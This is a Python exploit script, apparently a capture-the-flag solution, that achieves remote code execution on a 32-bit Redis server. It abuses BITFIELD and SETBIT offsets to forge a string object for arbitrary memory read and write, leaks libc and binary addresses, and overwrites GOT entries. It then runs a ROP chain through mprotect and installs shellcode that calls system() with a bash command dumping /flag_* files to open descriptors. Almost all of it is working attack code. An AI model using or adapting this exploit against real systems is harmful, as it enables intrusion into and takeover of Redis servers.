#!/usr/bin/env python3

import socket
import ctypes, struct

class FakeELF:
    def __init__(self, **kwargs):
        assert kwargs.keys() <= {'sym', 'got'}
        self._address = 0
        self.sym = kwargs.get('sym', {})
        self.got = kwargs.get('got', {})
    
    @property
    def address(self):
        return self._address
    
    @address.setter
    def address(self, base):
        delta = base - self._address
        self._address = base
        self.sym = {k: v+delta for k, v in self.sym.items()}
        self.got = {k: v+delta for k, v in self.got.items()}

class FakeRemote:
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
    
    def send(self, data):
        if isinstance(data, str):
            data = data.encode('ascii')
        self.s.send(data)

    def recv(self, length):
        data = b''
        while len(data) < length:
            recv = self.s.recv(length - len(data))
            if not recv:
                raise EOFError
            data += recv
        return data

    def recvall(self):
        data = b''
        while True:
            recv = self.s.recv(0x1000)
            if not recv:
                break
            data += recv
        return data
    
    def recvuntil(self, until, drop=False):
        data = b''
        while not data.endswith(until):
            recv = self.s.recv(1)
            if not recv:
                raise EOFError
            data += recv
        return data[:-len(until)] if drop else data
    
    def close(self):
        self.s.close()

class FakeLogger:
    def info(self, s):
        print(f'[*] {s}')
    
    def success(self, s):
        print(f'[+] {s}')

HOST, PORT = 'rendezvous', 65402
p = FakeRemote(HOST, PORT)

log = FakeLogger()

binary = FakeELF(got={'strtold': 0x246108, 'fcntl64': 0x246364, 'vsnprintf': 0x246234, 'backtrace': 0x2460cc})
libc = FakeELF(sym={'system': 0x3ec00, 'mprotect': 0xf5fd0, 'strtold': 0x35790, 'vsnprintf': 0x6fdd0, '_exit': 0xc0c45})
ld = FakeELF(sym={'_rtld_global': 0x29040})

def query(qs):
    def _query(q):
        if isinstance(q, str):
            q = q.encode('ascii')
        
        if isinstance(q, (list, tuple)):
            p.send(f'*{len(q)}\r\n'.encode('ascii'))
            for qe in q:
                _query(qe)
        else:
            assert isinstance(q, (bytes, bytearray))
            p.send(f'${len(q)}\r\n'.encode('ascii') + q + b'\r\n')
    
    def _resp():
        first = p.recv(1)
        if first == b'+':
            return p.recvuntil(b'\r\n', drop=True)
        elif first == b'-':
            err = p.recvuntil(b'\r\n', drop=True)
            raise RuntimeError(f'Redis returned Error: {err}')
        elif first == b':':
            return int(p.recvuntil(b'\r\n', drop=True))
        elif first == b'$':
            length = int(p.recvuntil(b'\r\n', drop=True))
            data = p.recv(length)
            assert p.recv(2) == b'\r\n'
            return data
        else:
            assert first == b'*'
            length = int(p.recvuntil(b'\r\n', drop=True))
            return [_resp() for _ in range(length)]
    
    if isinstance(qs, str):
        qs = qs.encode('ascii')
    
    if isinstance(qs, (bytes, bytearray)):
        p.send(qs + b'\r\n')
    else:
        _query(qs)
    
    return _resp()

# We don't need this anymore :)
#def query_addr(obj):
#    return int(query(f'''debug object {obj}''').split()[1][3:], 16)

def p32(v, endian='little'):
    return struct.pack('<I' if endian=='little' else '>I', v)

def u32(v, endian='little'):
    return struct.unpack('<I' if endian=='little' else '>I', v)[0]

def endian_rev(v):
    return u32(p32(v, endian='big'), endian='little')

# Note: The use of debug command can be avoided, allowing the exploit to be sent with a single eval command.
log.info('Spraying heap & setting up memory layout...')
#assert query('''config set save ""''') == b'OK'
#assert query('''config set proto-max-bulk-len 2147483647''') == b'OK'
assert query('''eval "for i=0,0x180000,1 do redis.call('set', 'K'..i, 0) end return 1337" 0''') == 1337
assert query('''eval "for i=0,0x180000,1 do if i%0x100==0 then redis.call('set', 'IIIIIIIIIIIIIIII'..i, 0) end redis.call('set', 'K'..i, '') end return 31337" 0''') == 31337
assert query('''setbit fill 335544320 0''') == 0
assert query('''setbit L 3221225472 0''') == 0

# leak address from K{K_idx} (embstr)
K_addr = endian_rev(query('''bitfield L set u32 4294967288 0''')[0]) - 0xf
assert K_addr & 0x7 == 0
log.info(f'Leaked address {hex(K_addr)}')

# set K{K_idx + 1} type = OBJ_STRING, encoding = OBJ_ENCODING_INT
assert query(f'bitfield L set i64 4294967295 {0x10 >> 1}')[0] & 0x7f == 0x80 >> 1
K_idx = query('''eval "for i=0x100000,0,-1 do if redis.call('get', 'K'..i)~='' then return i end end return -1" 0''') - 1
assert K_idx >= 0
log.success(f'Leak was from K{K_idx}')

L_addr = K_addr - 0x20000000
L_data = L_addr + 9
log.info(f'sdshdr32 struct address of L: {hex(L_addr)} (data {hex(L_data)})')

# prepare fake sds object inside L
fakesds = L_addr + 0x17000000
fakesds_data = fakesds + 9
assert query([
    'setrange', 'L', str(fakesds - L_data),
    p32(0x7fffffff)*2 + bytes([3])
]) == 0x18000001

# set K{K_idx + 1} ptr to fakesds_data
delta = ctypes.c_int32(fakesds_data).value - ctypes.c_int32(K_addr + 0x10 + 0xf).value
assert query(f'incrby K{K_idx + 1} {delta}') == ctypes.c_int32(fakesds_data).value

# set K{K_idx + 1} type = OBJ_STRING, encoding = OBJ_ENCODING_RAW
assert query('bitfield L set i64 4294967295 0')[0] == 0x10 >> 1
log.success(f'K{K_idx + 1}->ptr = fakesds @ {hex(fakesds)}')

def reader(addr, length):
    ofs = (addr - fakesds_data) & 0xffffffff
    assert ofs + length <= 0x20000000
    return query(f'getrange K{K_idx + 1} {ofs} {ofs + length - 1}')

# leak libc address
expected_at = K_addr - ((K_idx & 0xff) + 1) * 0x10 + 4
for i in range(0x1000):
    addr = u32(reader(expected_at + i * 0x10, 4)) + 0x1c460
    if addr & 0xfff == 0:
        libc.address = addr
        break
else:
    assert False

assert reader(libc.address, 4) == b'\x7FELF'
log.success(f'libc base:         {hex(libc.address)}')

# 0x678000 for local, 0x679000 at remote. Dunno why...
for ofs in range(0x678000, 0x679001, 0x1000):
    log.info(f'Trying offset {hex(ofs)}...')
    ld.address = libc.address + ofs
    if reader(ld.address, 4) == b'\x7FELF':
        log.success(f'ld base found at libc + {hex(ofs)}')
        break
else:
    assert False
log.info   (f'ld base:           {hex(ld.address)}')

# get link_map struct of redis-server binary from _rtld_global._dl_ns._ns_loaded
rtld_global = ld.sym['_rtld_global']
link_map = u32(reader(rtld_global, 4))
log.success(f'link_map:          {hex(link_map)}')

# leak redis-server binary from link_map
binary.address = u32(reader(link_map, 4))
assert binary.address & 0xfff == 0
log.success(f'redis-server base: {hex(binary.address)}')

# now set fakesds to some data inside redis-server (offset found using script below)
'''
>>> for i in range(0x100000):
...     length = u32(bin.read(i, 4))
...     alloc = u32(bin.read(i+4, 4))
...     flag = bin.read(i+8, 1)[0]
...     if length in range(0x20000000, 0x80000000) and alloc >= length and flag & 0b111 == 3:
...             print(hex(i), hex(length), hex(alloc), hex(flag))
... 
0x15a 0x74a8001b 0x74a8001b 0x1b
0x1f9 0x2756d67d 0x99a996ab 0x2b
0x255 0x44180004 0xc1b00001 0x3
(...)
'''
fakesds_bin = binary.address + 0x255
fakesds_bin_data = fakesds_bin + 9

# set K{K_idx + 1} type = OBJ_STRING, encoding = OBJ_ENCODING_INT
assert query(f'bitfield L set i64 4294967295 {0x10 >> 1}')[0] == 0

# set K{K_idx + 1} ptr to fakesds_bin_data
delta = ctypes.c_int32(fakesds_bin_data).value - ctypes.c_int32(fakesds_data).value
assert query(f'incrby K{K_idx + 1} {delta}') == ctypes.c_int32(fakesds_bin_data).value

# set K{K_idx + 1} type = OBJ_STRING, encoding = OBJ_ENCODING_RAW
assert query('bitfield L set i64 4294967295 0')[0] == 0x10 >> 1
log.success(f'K{K_idx + 1}->ptr = fakesds @ {hex(fakesds_bin_data)}')

def writer(addr, data):
    ofs = (addr - fakesds_bin_data) & 0xffffffff
    assert ofs + len(data) <= 0x20000000
    assert query(['setrange', f'K{K_idx + 1}', str(ofs), data]) == 0x44180004

# overwrite fcntl64@got with return FD_CLOEXEC;
# Note: We already have RCE, so simply opening a new port from attacker server
#       & writing to it would suffice. This is just to re-use the already open
#       connection as a POC
writer(binary.got['fcntl64'], p32(libc.address + 0x2ffa8))

# overwrite strtold@got with ROP popN-ret gadget
shellcode_addr = (L_data + 0x1000) & (~0xfff)
'''
libc gadgets
0x000af30b : add esp, 0x38 ; pop ebx ; ret
0x000ae987 : pop eax ; pop edi ; pop esi ; ret
0x000190f1 : ret
0x000314db : ret 0x1174

esp + 0x1450
'''
writer(binary.got['strtold'], p32(libc.address + 0xaf30b))

payload = b''.join([
    b' \0\0\0',  # isspace(buf[0])
    p32(0),
    p32(libc.sym['mprotect']),  # first ret
    p32(libc.address + 0xae987),
    p32(shellcode_addr),
    p32(0x1000),
    p32(7),  # on mprotect success, eax = 0 which is an error for string2ld.
] + [p32(libc.address + 0x190f1)] * 0x9d + [
    p32(libc.address + 0x314db),
    p32(binary.address + 0x576c8)  # inside function epilogue of string2ld
])

try:
    query([
        b'incrbyfloat',
        b'lol',
        payload
    ])
except:
    pass  # We expect Redis to return ERR!
else:
    assert False

# fix it back up :)
writer(binary.got['strtold'], p32(libc.sym['strtold']))

# write our magical shellcode
'''
mov eax, dword ptr [esp+0xc]
cmp dword ptr [eax], 0x6e6b6e75  # 'unkn'
jnz $+9
mov ecx, 0xdeadbeef => libc.sym['vsnprintf']
xor eax, eax
jmp ecx
pusha
mov ecx, 0x1337c0d3 => shell script addr
push ecx
mov ecx, 0xcafebabe => libc.sym['system']
call ecx
pop ecx
popa
xor eax, eax
ret
'''
shellcode = b'\x8B\x44\x24\x0C\x81\x38\x75\x6E\x6B\x6E\x74\x09\xB9\xEF\xBE\xAD\xDE\x31\xC0\xFF\xE1\x60\xB9\xD3\xC0\x37\x13\x51\xB9\xBE\xBA\xFE\xCA\xFF\xD1\x59\x61\x31\xC0\xC3'
shellcode = shellcode.ljust(0x800)
shellcode = shellcode.replace(p32(0xdeadbeef), p32(libc.sym['vsnprintf']))
shellcode = shellcode.replace(p32(0x1337c0d3), p32(shellcode_addr + 0x800))
shellcode = shellcode.replace(p32(0xcafebabe), p32(libc.sym['system']))
# send payload to top fd
shellcode += f'''bash -c 'i=100; while [ $i -ge 0 ]; do if [ -e /proc/self/fd/$i ]; then cat /flag_* 1>&$i; fi; i=$(( i - 1 )); done\''''.encode('ascii')
assert query([
    'setrange', 'L', str(shellcode_addr - L_data),
    shellcode
]) == 0x18000001
log.success(f'Shellcode @ {hex(shellcode_addr)}')

# hook vsnprintf to our shellcode to trigger our exploit at every unknown command
writer(binary.got['vsnprintf'], p32(shellcode_addr))

# just in case we crash, we want it to exit it instantly
writer(binary.got['backtrace'], p32(libc.sym['_exit']))

# we won't be doing any AAR/W, fix the memory structure so we don't crash at saves
# ...but we still freeze at bgsaves :crying_cat:
assert query(f'bitfield L set i64 4294967295 {0x010010 >> 1}')[0] == 0
assert query(f'bitfield L set u32 4294967288 {endian_rev(K_addr + 0xf)}')[0] == 0

# now test the exploit!
p.close()
p = FakeRemote(HOST, PORT)
p.send(b'lol\r\n')
print(p.recvuntil(b'}'))
